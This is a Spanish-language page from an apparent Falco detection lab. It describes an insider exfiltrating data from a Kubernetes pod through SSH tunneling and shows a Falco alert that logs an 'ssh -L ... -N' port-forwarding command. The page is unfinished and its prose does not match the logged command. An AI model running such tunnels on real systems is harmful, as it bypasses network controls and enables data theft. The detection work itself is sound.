# Scenario A: Exfiltración de Información mediante SSH Tunneling en Kubernetes

> SSH Port forwarding

<!-- <img src="../../assets/memoryDumping.webp" align="center" width="50%" height="50%"/> -->

<!-- <div style="text-align: center;"> -->

ewewe

<div style="display: flex; align-items: center; border: 1px solid #ddd; padding: 15px; border-radius: 8px;">
  <div style="flex: 1;">
    <img src="../../assets/ssh-port-forwarding.webp" style="max-width: 100%; height: auto; border-radius: 5px;" />
  </div>
  <div style="flex: 2; padding-left: 20px; text-align: justify;">
    <p>
      En un entorno corporativo seguro, un empleado malintencionado busca evadir las restricciones impuestas por la compañía y establecer un canal de comunicación no autorizado desde un pod de Kubernetes. Para lograrlo, configura una conexión <strong>SSH tunneling</strong> con el objetivo de exfiltrar información de manera encubierta.
    </p>
    <p>
      Aprovechando el acceso al pod, el atacante ejecuta comandos para establecer un <strong>túnel SSH reverso</strong> hacia una instancia de <em>Compute Engine</em> en <strong>Google Cloud Platform (GCP)</strong> bajo su control. Esta técnica le permite no solo extraer datos sensibles desde la infraestructura interna, sino también redirigir el tráfico de la subred en la que se encuentra el pod. Como resultado, el atacante obtiene acceso indirecto a otros recursos internos que, de otra manera, estarían protegidos por controles de red y políticas de seguridad.
    </p>
    <p>
      El uso de <strong>SSH tunneling</strong> en este contexto representa una amenaza significativa, ya que permite eludir firewalls y sistemas de monitoreo convencionales. Sin una solución de seguridad efectiva como <em>Falco runtime security</em>, este tipo de actividad podría pasar desapercibida, comprometiendo la integridad y confidencialidad de la información corporativa.
    </p>
  </div>
</div>


Redirigir el puerto 3306 (MySQL) del servidor remoto (34.27.180.215) al pod a través de una conexión SSH. En otras palabras, cualquier conexión a localhost:3306 en el pod se enviará al puerto 3306 del servidor remoto.


### Why can this be a security risk?

🔸Exposición del puerto local: El port forwarding (-L o -R) puede exponer puertos locales o remotos a accesos no autorizados. Si un puerto se reenvía de forma inapropiada, personas no autorizadas podrían acceder a servicios internos a través de un puerto que, de otra manera, estaría cerrado.

🔸 Túneles sin cifrar o inseguridad en el canal SSH: Aunque el canal SSH está cifrado, si las credenciales de acceso (como las claves SSH) no están bien protegidas o si la máquina local es comprometida, un atacante podría utilizar ese túnel para realizar actividades maliciosas o interceptar comunicaciones.

🔸 Uso de un proxy SOCKS o VPN: El comando ssh -D establece un proxy SOCKS y el comando ssh -w establece un túnel VPN, lo cual podría permitir que el tráfico se enrute a través de servidores no confiables. Si no se asegura que el servidor SSH sea confiable y seguro, un atacante podría tener acceso a toda la comunicación a través de esos túneles y potencialmente robar información sensible.

🔸 Acceso a redes privadas o recursos internos: Al hacer tunneling de puertos o utilizar VPN, puedes acceder a redes internas o recursos privados. Si no se configuran correctamente las reglas de firewall o se hacen cambios inadvertidos, estos túneles podrían exponer redes sensibles a posibles atacantes.


## Scenario



Se puede observar que se levanta la regla en Falco.

    {"hostname":"falcox33-falco-obsec-s6nzm","output":"01:30:39.455536915: Warning ssh tunneling (user=<NA> user_loginuid=-1 program=ssh command=ssh -L 60080:127.0.0.1:60080 -N ots-yODc2NGQ@10.10.10.133 ots-yODc2NGQ@10.10.10.133 pid=3598 file=<NA> parent=bash gparent=containerd-shim ggparent=systemd gggparent=<NA> container_id=b83b3f40cab2 image=sha256) k8s.ns=falco-custom-lab k8s.pod=sneaky container=b83b3f40cab2","priority":"Warning","rule":"ssh tunneling/ssh port forwarding","source":"syscall","tags":["T1572","container","host","mitre_command_and_control","network"],"time":"2025-02-22T01:30:39.455536915Z", "output_fields": {"container.id":"b83b3f40cab2","container.image.repository":"sha256","evt.time":1740187839455536915,"fd.name":null,"k8s.ns.name":"falco-custom-lab","k8s.pod.name":"sneaky","proc.aname[2]":"containerd-shim","proc.aname[3]":"systemd","proc.aname[4]":null,"proc.cmdline":"ssh -L 60080:127.0.0.1:60080 -N ots-yODc2NGQ@10.10.10.133 ots-yODc2NGQ@10.10.10.133","proc.name":"ssh","proc.pid":3598,"proc.pname":"bash","user.loginuid":-1,"user.name":"<NA>"}}

